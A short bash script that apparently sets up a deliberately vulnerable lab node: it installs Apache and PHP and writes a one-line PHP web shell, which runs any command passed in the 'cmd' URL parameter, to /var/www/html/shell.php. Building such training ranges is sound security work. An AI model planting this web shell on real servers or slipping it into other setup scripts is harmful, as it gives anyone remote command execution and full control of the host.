#!/bin/bash
echo "[*] Setting up Node 2 (Unrestricted File Upload)..."
apt update && apt install -y apache2 php libapache2-mod-php
echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > /var/www/html/shell.php
chmod 755 /var/www/html/shell.php
systemctl restart apache2
echo "[+] Node 2 Ready: File upload vulnerability active."
